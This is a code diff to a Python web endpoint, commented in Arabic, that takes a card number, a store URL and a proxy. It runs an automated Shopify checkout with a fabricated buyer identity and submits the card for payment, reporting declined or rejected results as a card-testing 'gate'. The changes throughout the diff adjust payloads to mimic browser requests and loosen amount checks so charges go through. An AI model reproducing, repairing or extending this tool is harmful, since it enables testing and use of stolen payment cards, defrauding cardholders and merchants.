@@ -21,7 +21,7 @@ def format_proxy(proxy_str):
     elif len(parts) == 2: return f"http://{parts[0]}:{parts[1]}"
     return f"http://{proxy_str}"
 
-def safe_response(msg, raw_data, price, gate="Python Dynamic V21"):
+def safe_response(msg, raw_data, price, gate="Python Dynamic V22 (Mirror)"):
     raw_clean = str(raw_data).replace('\n', ' ').replace('\r', '').replace('  ', '')[:400] if raw_data else "No Raw Data"
     final_msg = f"{msg} | RAW: {raw_clean}" if ("Failed" in msg or "Error" in msg or "Declined" in msg or "Rejected" in msg or "Empty" in msg or "Blocked" in msg) else msg
     clean_price = str(price).replace('$', '').strip() if price else "-"
@@ -44,7 +44,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
         buyer = {
             "email": f"j.doe{random.randint(10000,99999)}@gmail.com", "first_name": "James", "last_name": "Smith",
-            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "2125551234"
+            "address1": "4024 College Point Blvd", "city": "Flushing", "province": "NY", "zip": "11354", "country": "US", "phone": "5862156546"
         }
 
         with requests.Session() as session:
@@ -123,12 +123,15 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
             if res_pci.status_code != 200: return JSONResponse(content=safe_response("Stripe Rejected Card Data", res_pci.text[:80], price))
             card_session_id = res_pci.json().get("id")
 
-            # تجهيز العنوان الكامل ليتم إرساله من اللحظة الأولى
             flat_address = {
                 "address1": buyer["address1"], "address2": "", "city": buyer["city"], "countryCode": buyer["country"],
                 "postalCode": buyer["zip"], "firstName": buyer["first_name"], "lastName": buyer["last_name"],
                 "zoneCode": buyer["province"], "phone": buyer["phone"]
             }
+            
+            # العلبة الدقيقة اللي المتصفح بيبعتها
+            partial_address = flat_address.copy()
+            partial_address["oneTimeUse"] = False
 
             gql_url = f"{store_url}/checkouts/unstable/graphql?operationName=Proposal"
             gql_headers = {
@@ -169,8 +172,7 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "sessionInput": {"sessionToken": session_token},
                 "delivery": {
                     "deliveryLines": [{
-                        # 🔥 الضربة القاضية: إرسال العنوان الكامل (streetAddress) من أول لحظة لمنع أي إعادة حساب
-                        "destination": {"streetAddress": flat_address},
+                        "destination": {"partialStreetAddress": partial_address},
                         "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": "any", "customDeliveryRate": False}, "options": {}},
                         "targetMerchandiseLines": {"lines": [{"stableId": merch_id}]},
                         "deliveryMethodTypes": ["SHIPPING"], "expectedTotalPrice": {"any": True}, "destinationChanged": False
@@ -202,13 +204,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
 
             seller_proposal = negotiate_res.get('sellerProposal', {})
             
-            exact_amount_constraint = {"any": True}
             currency = "USD"
             total_val = seller_proposal.get('total', {}).get('value')
-            if total_val and 'amount' in total_val and 'currencyCode' in total_val:
-                exact_amount_constraint = {"value": {"amount": total_val['amount'], "currencyCode": total_val['currencyCode']}}
+            if total_val and 'currencyCode' in total_val:
                 currency = total_val['currencyCode']
-                price = f"{total_val['amount']} {currency}"
+                price = f"{total_val.get('amount', '')} {currency}"
                 
             tax_constraint = {"any": True}
             tax_val = seller_proposal.get('tax', {}).get('totalTaxAmount', {}).get('value')
@@ -271,23 +271,28 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                 "input": {
                     "sessionInput": {"sessionToken": session_token},
                     "queueToken": queue_token,
+                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True}, # من اكتشافات المتصفح
                     "delivery": {
                         "deliveryLines": [{
-                            "destination": {"streetAddress": flat_address}, # مطابق تماماً للي تم إرساله في הـ Proposal
+                            "destination": {"partialStreetAddress": partial_address}, # العلبة السحرية رجعت
                             "targetMerchandiseLines": {"lines": target_lines},
                             "deliveryMethodTypes": ["SHIPPING"],
                             "destinationChanged": False,
-                            "selectedDeliveryStrategy": {"deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False}, "options": {}},
+                            "selectedDeliveryStrategy": {
+                                "deliveryStrategyByHandle": {"handle": delivery_handle, "customDeliveryRate": False},
+                                "options": {"phone": buyer["phone"]} # إضافة التليفون الإجبارية المخفية
+                            },
                             "expectedTotalPrice": del_amt_constraint
                         }],
                         "noDeliveryRequired": [],
                         "useProgressiveRates": False,
+                        "prefetchShippingRatesStrategy": None,
                         "supportsSplitShipping": True
                     },
                     "merchandise": {"merchandiseLines": submit_merch_lines},
                     "taxes": {"proposedTotalAmount": tax_constraint},
                     "payment": {
-                        "totalAmount": exact_amount_constraint,
+                        "totalAmount": {"any": True}, # وداعا لحسابات الدفع المعقدة!
                         "paymentLines": [{
                             "paymentMethod": {
                                 "directPaymentMethod": {
@@ -296,11 +301,11 @@ def api_endpoint(cc: str = Query(...), url: str = Query(...), proxy: str = Query
                                     "billingAddress": {"streetAddress": flat_address}
                                 }
                             },
-                            "amount": exact_amount_constraint
+                            "amount": {"any": True} # وداعا لحسابات الدفع المعقدة!
                         }],
                         "billingAddress": {"streetAddress": flat_address}
                     },
-                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": buyer["email"], "phoneCountryCode": "US"}
+                    "buyerIdentity": {"customer": {"presentmentCurrency": currency, "countryCode": "US"}, "email": buyer["email"], "emailChanged": False, "phoneCountryCode": "US", "marketingConsent": [], "shopPayOptInPhone": {"number": buyer["phone"], "countryCode": "US"}, "rememberMe": False}
                 }
             }
             
